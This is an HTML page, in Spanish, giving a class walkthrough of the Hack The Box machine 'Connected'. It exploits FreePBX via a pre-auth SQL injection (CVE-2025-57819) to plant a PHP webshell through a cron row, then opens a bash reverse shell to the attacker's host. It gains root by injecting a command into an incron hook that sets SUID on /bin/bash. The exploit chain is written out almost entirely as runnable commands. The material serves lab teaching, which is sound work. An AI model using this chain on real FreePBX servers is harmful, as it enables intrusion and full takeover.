@@ -1,0 +1,534 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="claude:viewport-fit-sides" content="cover">
+<title>Connected · Walkthrough</title>
+<style>
+  /* Layout: una columna de lectura, pasos numerados con bloques de comando y notas al margen */
+  :root {
+    --bg: #f6f7f4;
+    --surface: #ffffff;
+    --surface-2: #eceee8;
+    --fg: #1c2321;
+    --muted: #5c655f;
+    --line: #d7dad2;
+    --accent: #1f7a4d;       /* verde terminal, sobrio */
+    --accent-soft: #e2f0e7;
+    --cmd-bg: #11201a;        /* bloque de comando, oscuro en ambos temas */
+    --cmd-fg: #d7f5e3;
+    --cmd-prompt: #5fcf8f;
+    --cmd-comment: #7fa890;
+    --warn: #b4531a;
+    --warn-soft: #f6e6da;
+    --root: #a3341f;
+    --mono: "JetBrains Mono", ui-monospace, "SF Mono", Menlo, Consolas, monospace;
+    --sans: "Inter", system-ui, -apple-system, sans-serif;
+    --head: "Space Grotesk", var(--sans);
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #10130f;
+      --surface: #181c17;
+      --surface-2: #20251f;
+      --fg: #e6ebe4;
+      --muted: #9aa69b;
+      --line: #2c322a;
+      --accent: #5fcf8f;
+      --accent-soft: #15241b;
+      --cmd-bg: #0b1711;
+      --cmd-fg: #d7f5e3;
+      --cmd-prompt: #5fcf8f;
+      --cmd-comment: #6f9480;
+      --warn: #e0894f;
+      --warn-soft: #2a1d12;
+      --root: #e8785e;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #10130f;
+    --surface: #181c17;
+    --surface-2: #20251f;
+    --fg: #e6ebe4;
+    --muted: #9aa69b;
+    --line: #2c322a;
+    --accent: #5fcf8f;
+    --accent-soft: #15241b;
+    --cmd-bg: #0b1711;
+    --cmd-fg: #d7f5e3;
+    --cmd-prompt: #5fcf8f;
+    --cmd-comment: #6f9480;
+    --warn: #e0894f;
+    --warn-soft: #2a1d12;
+    --root: #e8785e;
+    color-scheme: dark;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--sans);
+    line-height: 1.6;
+    font-size: 16px;
+  }
+  .wrap {
+    max-width: 820px;
+    margin: 0 auto;
+    padding-left: max(16px, env(safe-area-inset-left, 0px));
+    padding-right: max(16px, env(safe-area-inset-right, 0px));
+    padding-block: 32px 72px;
+  }
+
+  header.hero {
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    background: var(--surface);
+    padding: 26px 24px;
+    margin-bottom: 14px;
+  }
+  .eyebrow {
+    font-family: var(--mono);
+    font-size: 12px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--accent);
+    margin: 0 0 10px;
+  }
+  h1 {
+    font-family: var(--head);
+    font-size: clamp(28px, 6vw, 40px);
+    line-height: 1.05;
+    margin: 0 0 12px;
+    text-wrap: balance;
+    letter-spacing: -0.01em;
+  }
+  .lede { color: var(--muted); margin: 0; max-width: 60ch; }
+  .meta {
+    display: flex; flex-wrap: wrap; gap: 8px;
+    margin-top: 18px;
+  }
+  .chip {
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 4px 10px;
+    border-radius: 999px;
+    background: var(--surface-2);
+    border: 1px solid var(--line);
+    color: var(--muted);
+  }
+  .chip b { color: var(--fg); font-weight: 600; }
+
+  .chain {
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    background: var(--surface);
+    padding: 18px 20px;
+    margin-bottom: 30px;
+  }
+  .chain h2 { font-family: var(--head); font-size: 14px; margin: 0 0 12px; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); }
+  .chain ol {
+    list-style: none; margin: 0; padding: 0;
+    display: flex; flex-wrap: wrap; align-items: center; gap: 6px 4px;
+    font-family: var(--mono); font-size: 13px;
+  }
+  .chain li { display: inline-flex; align-items: center; gap: 6px; }
+  .chain li span { background: var(--accent-soft); color: var(--accent); padding: 3px 9px; border-radius: 6px; white-space: nowrap; }
+  .chain li::after { content: "→"; color: var(--muted); margin-left: 4px; }
+  .chain li:last-child::after { content: ""; }
+
+  section.step {
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    background: var(--surface);
+    padding: 22px 22px 8px;
+    margin-bottom: 18px;
+  }
+  .step-head { display: flex; align-items: baseline; gap: 12px; margin-bottom: 4px; }
+  .step-num {
+    font-family: var(--mono);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent);
+    background: var(--accent-soft);
+    border-radius: 7px;
+    padding: 3px 9px;
+    flex: none;
+  }
+  .step-head h2 {
+    font-family: var(--head);
+    font-size: clamp(19px, 4vw, 23px);
+    margin: 0;
+    line-height: 1.2;
+    letter-spacing: -0.01em;
+  }
+  .goal { color: var(--muted); font-size: 14.5px; margin: 6px 0 16px; }
+
+  .block { margin: 0 0 18px; }
+  .block > p { margin: 0 0 8px; }
+
+  /* Bloque de comando */
+  .cmd {
+    position: relative;
+    background: var(--cmd-bg);
+    color: var(--cmd-fg);
+    border-radius: 10px;
+    padding: 14px 16px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 13.5px;
+    line-height: 1.55;
+    border: 1px solid rgba(255,255,255,0.06);
+  }
+  .cmd pre { margin: 0; white-space: pre; min-width: 0; }
+  .copy-btn {
+    position: absolute;
+    top: 8px;
+    right: 8px;
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: .04em;
+    color: #08130d;
+    background: var(--cmd-prompt);
+    border: 1px solid var(--cmd-prompt);
+    border-radius: 6px;
+    padding: 5px 11px;
+    cursor: pointer;
+    opacity: 1;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.35);
+    transition: transform .1s, filter .15s;
+    z-index: 3;
+  }
+  .copy-btn:hover { filter: brightness(1.1); }
+  .copy-btn:active { transform: scale(0.96); }
+  .copy-btn:focus-visible { outline: 2px solid #fff; outline-offset: 2px; }
+  .copy-btn.done { background: #e9fff2; border-color: #e9fff2; }
+  .cmd { padding-top: 40px; }
+  .cmd pre { padding-right: 16px; }
+  .cmd .pr { color: var(--cmd-prompt); user-select: none; }
+  .cmd .c { color: var(--cmd-comment); }
+  .cmd .o { color: #8fb8a6; display: block; } /* salida esperada */
+  .host-kali .pr::before { content: ""; }
+
+  .where {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: .04em;
+    text-transform: uppercase;
+    padding: 2px 8px;
+    border-radius: 5px;
+    margin-bottom: 8px;
+    border: 1px solid var(--line);
+  }
+  .where.kali { color: var(--accent); background: var(--accent-soft); }
+  .where.victima { color: var(--warn); background: var(--warn-soft); }
+
+  .explain { font-size: 14.5px; margin: 10px 0 2px; }
+  .explain strong { color: var(--fg); }
+  .explain code, p code, li code { font-family: var(--mono); font-size: 0.86em; background: var(--surface-2); padding: 1px 5px; border-radius: 4px; }
+
+  .what {
+    border-left: 3px solid var(--accent);
+    background: var(--accent-soft);
+    padding: 10px 14px;
+    border-radius: 0 8px 8px 0;
+    font-size: 14px;
+    margin: 12px 0 18px;
+  }
+  .what b { color: var(--accent); }
+  .note {
+    border-left: 3px solid var(--warn);
+    background: var(--warn-soft);
+    padding: 10px 14px;
+    border-radius: 0 8px 8px 0;
+    font-size: 14px;
+    margin: 12px 0 18px;
+  }
+  .note b { color: var(--warn); }
+
+  .flag {
+    font-family: var(--mono);
+    display: inline-block;
+    background: var(--surface-2);
+    border: 1px dashed var(--line);
+    padding: 3px 10px;
+    border-radius: 6px;
+    font-size: 13.5px;
+    word-break: break-all;
+  }
+
+  footer {
+    margin-top: 28px;
+    color: var(--muted);
+    font-size: 13px;
+    text-align: center;
+    font-family: var(--mono);
+  }
+  a { color: var(--accent); }
+  h3 { font-family: var(--head); font-size: 16px; margin: 20px 0 8px; }
+  ul.tips { margin: 8px 0 18px; padding-left: 18px; }
+  ul.tips li { margin-bottom: 7px; font-size: 14.5px; }
+</style>
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@500;600;700&display=swap">
+
+<div class="wrap">
+
+  <header class="hero">
+    <p class="eyebrow">HTB · Linux · Writeup para clase</p>
+    <h1>Connected de cero a root</h1>
+    <p class="lede">Paso a paso completo de la máquina <b>Connected</b> (FreePBX): cada comando en su línea, dónde se ejecuta, qué hace y qué debe ocurrir. Pensado para seguirlo sin saltarse nada.</p>
+    <div class="meta">
+      <span class="chip">IP <b>10.129.245.100</b></span>
+      <span class="chip">CVE <b>2025-57819</b></span>
+      <span class="chip">FreePBX <b>16.0.40.7</b></span>
+      <span class="chip">Dificultad <b>media</b></span>
+    </div>
+  </header>
+
+  <div class="chain">
+    <h2>El camino de un vistazo</h2>
+    <ol>
+      <li><span>Recon</span></li>
+      <li><span>FreePBX + CVE</span></li>
+      <li><span>SQLi → cron_jobs</span></li>
+      <li><span>Webshell (asterisk)</span></li>
+      <li><span>Reverse shell</span></li>
+      <li><span>incron hook</span></li>
+      <li><span>/bin/bash SUID</span></li>
+      <li><span>root</span></li>
+    </ol>
+  </div>
+
+  <!-- Convención de colores -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">Leyenda</span><h2>Antes de empezar: dos terminales</h2></div>
+    <p class="goal">Todo el rato trabajas con <b>dos ventanas de terminal</b>. No las mezcles: es el error más común.</p>
+    <p><span class="where kali">En Kali</span> &nbsp;Tu máquina de ataque. El prompt es <code>┌──(kali㉿kali)-[~]</code> / <code>└─$</code>.</p>
+    <p style="margin-top:10px;"><span class="where victima">En la víctima</span> &nbsp;La shell que consigues dentro de Connected. El prompt es <code>[asterisk@connected html]$</code> (y luego <code>bash-4.2#</code> como root).</p>
+    <div class="note"><b>Clave:</b> <code>[asterisk@connected html]$</code> <b>no se teclea</b> — es el prompt que te muestra la víctima, igual que <code>└─$</code> es el tuyo. Escribes los comandos a su derecha.</div>
+  </section>
+
+  <!-- Paso 0 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">00</span><h2>Variables de la sesión</h2></div>
+    <p class="goal">Guardamos IP y nuestra IP de VPN en variables para no repetirlas. Son <b>por-terminal</b>: si abres otra pestaña, hay que volver a definirlas.</p>
+    <span class="where kali">En Kali</span>
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>IP=10.129.245.100
+<span class="pr">$ </span>LHOST=$(ip -4 addr show tun0 | grep -oP '(?&lt;=inet )[\d.]+')
+<span class="pr">$ </span>echo "IP=$IP  LHOST=$LHOST"
+<span class="o">IP=10.129.245.100  LHOST=10.10.15.193</span></pre></div>
+    <p class="explain"><strong><code>IP=...</code></strong> fija la IP de la máquina objetivo. <strong><code>LHOST=$(...)</code></strong> extrae tu IP de la interfaz VPN <code>tun0</code> (si tu VPN usa otro nombre, míralo con <code>ip -4 a</code>). <strong><code>echo</code></strong> confirma que ambas tienen valor.</p>
+    <div class="what"><b>Qué ocurre:</b> si <code>LHOST</code> sale vacío, la reverse shell del paso 4 nunca conectará. Compruébalo aquí, no después.</div>
+  </section>
+
+  <!-- Paso 1 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">01</span><h2>Recon y fingerprint → encontrar el CVE</h2></div>
+    <p class="goal">De "no sé nada" a "esto es FreePBX 16 vulnerable a CVE-2025-57819".</p>
+    <span class="where kali">En Kali</span>
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>nmap -sCV -p- --min-rate 2000 $IP
+<span class="o">22/tcp  ssh   OpenSSH ...</span>
+<span class="o">80/tcp  http  Apache ...</span>
+<span class="o">443/tcp https  ... commonName=pbxconnect</span></pre></div>
+    <p class="explain"><strong><code>nmap -sCV -p-</code></strong> escanea los 65535 puertos con scripts y detección de versión. Aparecen 22, 80 y 443. El certificado de 443 ya filtra un nombre: <code>pbxconnect</code>.</p>
+
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>curl -skI http://$IP
+<span class="o">Location: http://connected.htb/</span>
+<span class="pr">$ </span>echo "$IP connected.htb pbxconnect" | sudo tee -a /etc/hosts</pre></div>
+    <p class="explain"><strong><code>curl -skI</code></strong> pide solo las cabeceras: el 80 redirige al vhost <code>connected.htb</code>. Lo añadimos a <strong><code>/etc/hosts</code></strong> para que el nombre resuelva a la IP.</p>
+
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>curl -sk https://connected.htb/admin/ | grep -iE 'freepbx|version'
+<span class="o">... FreePBX Administration ...</span>
+<span class="pr">$ </span><span class="c"># versión exacta en el módulo framework / footer del login</span>
+<span class="pr">$ </span>curl -sk https://connected.htb/admin/config.php | grep -iE 'framework|16\.'
+<span class="o">... 16.0.40.7 ...</span></pre></div>
+    <p class="explain">Confirmamos el producto (<strong>FreePBX Administration</strong>) y, sobre todo, la <strong>versión exacta</strong> <code>16.0.40.7</code>, que es la que decide si es vulnerable.</p>
+    <div class="what"><b>Qué ocurre:</b> buscando "FreePBX endpoint SQL injection 2025" + <code>searchsploit freepbx endpoint</code> llegas a <b>CVE-2025-57819</b>. La señal que dirige al CVE es la combinación <b>FreePBX 16.0.40.x + módulo <code>endpoint</code></b> (0-day explotado en agosto 2025, parcheado en 16.0.40.11 / 17.x).</div>
+  </section>
+
+  <!-- Paso 2 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">02</span><h2>Foothold: inyección SQL (CVE-2025-57819)</h2></div>
+    <p class="goal">SQLi preauth en el módulo <code>endpoint</code> → query apilada que inserta una tarea cron que escribe un webshell.</p>
+    <span class="where kali">En Kali</span>
+    <p class="explain" style="margin-top:0">Primero guardamos el payload en una variable (una sola línea; ojo al <b>espacio final tras <code>-- </code></b>, que es el comentario de MySQL):</p>
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>PAYLOAD="x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','webshell','echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==|base64 -d &gt;/var/www/html/webshell.php',NULL,'* * * * *',30,1,1) -- "
+<span class="pr">$ </span>echo "[$PAYLOAD]"   <span class="c"># debe terminar en:  --  (con espacio)</span></pre></div>
+    <p class="explain">El <code>echo ...|base64 -d</code> escribe el fichero <code>/var/www/html/webshell.php</code> con el contenido <code>&lt;?php system($_GET[cmd]); ?&gt;</code> (eso es lo que hay en el base64 <code>PD9waHAg...</code>). La fila queda con <code>schedule = '* * * * *'</code> → se ejecuta cada minuto.</p>
+
+    <p class="explain">Ahora lanzamos la inyección (una sola línea para que no se cuele el prompt al pegar):</p>
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>curl -sk -G --resolve connected.htb:443:$IP "https://connected.htb/admin/ajax.php" --data-urlencode 'module=FreePBX\modules\endpoint\ajax' --data-urlencode 'command=model' --data-urlencode 'template=x' --data-urlencode 'model=model' --data-urlencode "brand=$PAYLOAD"
+<span class="o">{"error":{..."Trying to access array offset on value of type bool"...}}</span></pre></div>
+    <p class="explain"><strong><code>-G --data-urlencode</code></strong> hace que curl codifique los parámetros (espacios, <code>\</code>, comillas) por ti, evitando el infierno de comillas en la shell. El <code>module=FreePBX\modules\endpoint\ajax</code> usa el namespace que <b>salta el chequeo de Referer</b>; el payload va en <code>brand</code>.</p>
+    <div class="what"><b>Qué ocurre:</b> que devuelva <b>vacío</b> o el error <code>"...array offset on value of type bool"</code> es <b>normal y buena señal</b>: tu <code>x'</code> rompió el SELECT original, pero el <code>;INSERT</code> apilado ya se ejecutó por detrás. Esta SQLi es a ciegas; no esperes ver el resultado aquí.</div>
+    <div class="note"><b>Trampa habitual:</b> no pegues el prompt <code>└─$</code> delante del comando → <code>command not found</code>. Y define <code>$PAYLOAD</code> en la <b>misma</b> terminal, con comillas <b>dobles</b> (lleva comillas simples dentro).</div>
+  </section>
+
+  <!-- Paso 3 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">03</span><h2>Cazar el webshell (es efímero)</h2></div>
+    <p class="goal">El cron recrea <code>webshell.php</code> cada minuto, pero desaparece entre ejecuciones → da 404 a ratos. Usamos una función con reintento.</p>
+    <span class="where kali">En Kali</span>
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>sh() { while :; do out=$(curl -sk -G --resolve connected.htb:443:$IP "https://connected.htb/webshell.php" --data-urlencode "cmd=$1"); case "$out" in *"404 Not Found"*|"") sleep 2 ;; *) printf '%s\n' "$out"; break ;; esac; done; }
+<span class="pr">$ </span>sleep 70        <span class="c"># esperar a que el cron corra al menos una vez</span>
+<span class="pr">$ </span>sh 'id'
+<span class="o">uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)</span></pre></div>
+    <p class="explain"><strong><code>sh()</code></strong> es una función: pide <code>webshell.php?cmd=...</code> en bucle; si recibe un 404 (o vacío) espera 2s y reintenta; en cuanto recibe salida real la imprime y sale. Así cazas la ventana en que el fichero existe.</p>
+    <div class="what"><b>Qué ocurre:</b> ver <code>uid=999(asterisk)</code> confirma <b>RCE como el usuario asterisk</b>. El foothold funcionó. Si el bucle gira más de ~70s sin pillar nada, el cron dejó de recrearlo → vuelve al paso 2 (re-inyecta) y repite.</div>
+  </section>
+
+  <!-- Paso 4 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">04</span><h2>Reverse shell (salir del webshell frágil)</h2></div>
+    <p class="goal">El webshell es inestable; saltamos a una shell interactiva por TCP que no depende del fichero.</p>
+    <span class="where kali">En Kali · Terminal A (listener)</span>
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>nc -lvnp 443
+<span class="o">listening on [any] 443 ...</span></pre></div>
+    <p class="explain"><strong><code>nc -lvnp 443</code></strong> pone a Kali a escuchar en el puerto 443. <b>Déjala quieta.</b></p>
+    <div class="note"><b>NO aprietes <code>Ctrl+Z</code> aquí.</b> Mientras el <code>nc</code> solo escucha (sin conexión), <code>Ctrl+Z</code> lo suspende y <b>mata el listener</b>. El <code>Ctrl+Z</code> solo se usa en el paso 5, y con la conexión ya establecida.</div>
+
+    <span class="where kali">En Kali · Terminal B (dispara)</span>
+    <div class="cmd host-kali"><pre><span class="pr">$ </span>sh "bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/443 0&gt;&amp;1'"</pre></div>
+    <p class="explain">Reusa la función <code>sh</code> para ejecutar en la víctima una <strong>bash reversa</strong> que conecta de vuelta a tu <code>$LHOST</code> en el 443. <b>Este comando no muestra nada</b> — es correcto: la shell cae en la Terminal A.</p>
+    <div class="what"><b>Qué ocurre:</b> en la Terminal A aparece <code>connect to [tu_ip] from ... connected.htb</code> y el prompt <code>[asterisk@connected html]$</code>. Ya tienes shell estable.</div>
+  </section>
+
+  <!-- Paso 5 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">05</span><h2>Estabilizar la shell (opcional pero cómodo)</h2></div>
+    <p class="goal">Convertir la shell tonta en un TTY. En Connected <b>solo existe <code>python2</code></b> (ni python ni python3).</p>
+    <span class="where victima">En la víctima</span>
+    <div class="cmd"><pre><span class="pr">$ </span>python2 -c 'import pty;pty.spawn("/bin/bash")'
+<span class="pr">$ </span>export TERM=xterm</pre></div>
+    <p class="explain"><strong><code>pty.spawn</code></strong> te da un pseudo-terminal (flechas, tab, Ctrl+C). <strong><code>export TERM=xterm</code></strong> arregla el tipo de terminal.</p>
+    <div class="what"><b>Qué ocurre (ahora sí, con la conexión viva):</b> para poder pegar comandos en bloque sin que se amontonen, aprieta <code>Ctrl+Z</code> → en <b>Kali</b> escribe <code>stty raw -echo; fg</code> → pulsa Enter. Esto <b>no desconecta</b>, solo devuelve la shell ya estabilizada.</div>
+    <div class="note"><b>Si no quieres arriesgarte con <code>Ctrl+Z</code>:</b> sáltate el <code>stty</code> y trabaja escribiendo <b>un comando cada vez</b> (Enter tras cada uno). Esta shell amontona las líneas si pegas varias de golpe.</div>
+  </section>
+
+  <!-- Paso 6 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">06</span><h2>Flag de user</h2></div>
+    <span class="where victima">En la víctima</span>
+    <div class="cmd"><pre><span class="pr">$ </span>ls -la /home
+<span class="o">drwxr-xr-x 10 asterisk asterisk  ... asterisk</span>
+<span class="pr">$ </span>cat /home/asterisk/user.txt
+<span class="o">ab7f8d3cbfa45e4eb7f399784cd25f8d</span></pre></div>
+    <p class="explain">Solo hay un home de usuario, <code>asterisk</code>. La flag está en <code>/home/asterisk/user.txt</code>. Si no estuviera: <code>find / -name user.txt 2>/dev/null</code>.</p>
+    <div class="what"><b>Flag user:</b> <span class="flag">ab7f8d3cbfa45e4eb7f399784cd25f8d</span> <span style="color:var(--muted);font-size:13px">(cambia en cada reset de la máquina)</span></div>
+  </section>
+
+  <!-- Paso 7 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">07</span><h2>Privesc a root: incron + hook sysadmin</h2></div>
+    <p class="goal"><code>incrond</code> corre como <b>root</b> y vigila <code>/var/spool/asterisk/incron/</code> (escribible por asterisk). Un fichero con nombre especial dispara <code>fwconsole</code> con inyección de comando.</p>
+    <span class="where victima">En la víctima</span>
+    <div class="cmd"><pre><span class="pr">$ </span>ls -ld /var/spool/asterisk/incron/
+<span class="o">drwxrwxr-x 2 asterisk asterisk ... /var/spool/asterisk/incron/</span></pre></div>
+    <p class="explain">Confirmamos que el directorio existe y es <b>escribible</b> por nuestro usuario (<code>rwx</code> para el grupo asterisk).</p>
+
+    <p class="explain">Generamos el nombre del fichero trampa. El hook <code>fwconsole-commands</code> decodifica el payload y lo pasa a <code>fwconsole</code>; metemos un <code>;</code> para inyectar un segundo comando que ponga SUID a bash:</p>
+    <div class="cmd"><pre><span class="pr">$ </span>python2 -c 'import zlib,base64,json;print("api.fwconsole-commands."+base64.b64encode(zlib.compress(json.dumps(["help; chmod u+s /bin/bash","txn"]))).replace("/","_"))'
+<span class="o">api.fwconsole-commands.eJyLVspIzSmwVkjOyM1PUSjVLlbQT8rM009KLM5Q0lFQKqnIU4oFANkjC34=</span></pre></div>
+    <p class="explain">El payload es <code>base64(zlib.compress(json([cmd,"txn"])))</code> con <code>/</code> → <code>_</code>, siendo <code>cmd = "help; chmod u+s /bin/bash"</code>. El <code>help</code> es un comando válido de fwconsole; el <code>;</code> encadena nuestro <code>chmod</code>.</p>
+
+    <p class="explain">Creamos el fichero con <b>la cadena real</b> (no el literal <code>&lt;CADENA&gt;</code>) y esperamos unos segundos a que root lo procese:</p>
+    <div class="cmd"><pre><span class="pr">$ </span>touch "/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVspIzSmwVkjOyM1PUSjVLlbQT8rM009KLM5Q0lFQKqnIU4oFANkjC34="
+<span class="pr">$ </span>sleep 6
+<span class="pr">$ </span>ls -l /bin/bash
+<span class="o">-rwsr-xr-x 1 root root 964536 ... /bin/bash</span></pre></div>
+    <div class="what"><b>Qué ocurre:</b> <code>incrond</code> (root) ve el fichero nuevo, ejecuta <code>sysadmin_manager</code> → <code>fwconsole</code> → corre tu <code>chmod u+s /bin/bash</code>. La <code>s</code> en <code>-rw<b>s</b>r-xr-x</code> confirma que <code>/bin/bash</code> ya es <b>SUID root</b>.</div>
+    <div class="note"><b>Trampa habitual:</b> si dejas el literal <code>&lt;CADENA&gt;</code> en el <code>touch</code>, el hook no dispara y <code>/bin/bash</code> seguirá como <code>-rwxr-xr-x</code>. Copia la cadena exacta que imprimió python2.</div>
+  </section>
+
+  <!-- Paso 8 -->
+  <section class="step">
+    <div class="step-head"><span class="step-num">08</span><h2>Convertirse en root y leer la flag</h2></div>
+    <span class="where victima">En la víctima</span>
+    <div class="cmd"><pre><span class="pr">$ </span>bash -p
+<span class="pr">#</span> id
+<span class="o">uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)</span>
+<span class="pr">#</span> cat /root/root.txt
+<span class="o">68d66a7101c868e82b8f20a336fc55bd</span></pre></div>
+    <p class="explain"><strong><code>bash -p</code></strong> arranca bash <b>conservando el euid</b> del binario SUID → <code>euid=0(root)</code>. Ya puedes leer <code>/root/root.txt</code>.</p>
+    <div class="what"><b>Flag root:</b> <span class="flag">68d66a7101c868e82b8f20a336fc55bd</span></div>
+    <h3>Root "completo" (opcional)</h3>
+    <p class="explain">Con <code>bash -p</code> tienes <code>euid=0</code> pero <code>uid=999</code>. Si alguna herramienta se queja, consigue uid=0 real:</p>
+    <div class="cmd"><pre><span class="pr">#</span> python2 -c 'import os;os.setuid(0);os.system("/bin/bash")'</pre></div>
+  </section>
+
+  <section class="step">
+    <div class="step-head"><span class="step-num">★</span><h2>Checklist de errores que ya pisamos</h2></div>
+    <ul class="tips">
+      <li><b>Prompt pegado:</b> no copies <code>└─$</code> ni <code>[asterisk@connected html]$</code> dentro del comando.</li>
+      <li><b>Terminal equivocada:</b> enumeración y privesc van en la <b>víctima</b>, no en Kali. Mira el prompt antes de teclear.</li>
+      <li><b><code>Ctrl+Z</code> prematuro:</b> mata el <code>nc</code> si aún no hay conexión. Úsalo solo en el paso 5.</li>
+      <li><b>Variables vacías:</b> <code>$IP</code>, <code>$LHOST</code>, <code>$PAYLOAD</code> son por-terminal. Redefínelas si cambias de pestaña.</li>
+      <li><b>Comillas:</b> el payload va en comillas <b>dobles</b> (lleva simples dentro); con <code>curl -G --data-urlencode</code>.</li>
+      <li><b>Espacio final en <code>-- </code>:</b> sin él, MySQL no toma el comentario y la query falla.</li>
+      <li><b>Shell que amontona:</b> pega comandos de uno en uno, o estabiliza con <code>stty raw -echo; fg</code>.</li>
+      <li><b>Solo <code>python2</code>:</b> en Connected no hay <code>python</code> ni <code>python3</code>.</li>
+    </ul>
+  </section>
+
+  <footer>
+    FreePBX 16.0.40.7 → CVE-2025-57819 → asterisk → incron → root · writeup para clase
+  </footer>
+
+</div>
+
+<script>
+  // Botón copiar en cada bloque de comandos.
+  // Copia solo las líneas de comando: quita el prompt ($ / #) y las líneas de salida (.o).
+  (function () {
+    function commandText(cmd) {
+      var pre = cmd.querySelector('pre');
+      if (!pre) return '';
+      var clone = pre.cloneNode(true);
+      clone.querySelectorAll('.o').forEach(function (n) { n.remove(); });
+      clone.querySelectorAll('.pr').forEach(function (n) { n.remove(); });
+      var text = clone.textContent.replace(/\n{2,}/g, '\n');
+      return text.split('\n').map(function (l) { return l.replace(/\s+$/, ''); })
+                 .filter(function (l) { return l.length; }).join('\n');
+    }
+    function flash(btn, label) {
+      btn.textContent = label;
+      btn.classList.add('done');
+      setTimeout(function () { btn.textContent = 'Copiar'; btn.classList.remove('done'); }, 1400);
+    }
+    function fallbackCopy(text, btn) {
+      try {
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.setAttribute('readonly', '');
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        var ok = document.execCommand('copy');
+        document.body.removeChild(ta);
+        flash(btn, ok ? '¡Copiado!' : 'Copia manual');
+      } catch (e) { flash(btn, 'Copia manual'); }
+    }
+    document.querySelectorAll('.cmd').forEach(function (cmd) {
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copiar';
+      btn.setAttribute('aria-label', 'Copiar comandos de este bloque');
+      btn.addEventListener('click', function () {
+        var text = commandText(cmd);
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(function () { flash(btn, '¡Copiado!'); })
+            .catch(function () { fallbackCopy(text, btn); });
+        } else { fallbackCopy(text, btn); }
+      });
+      cmd.appendChild(btn);
+    });
+  })();
+</script>
+</html>
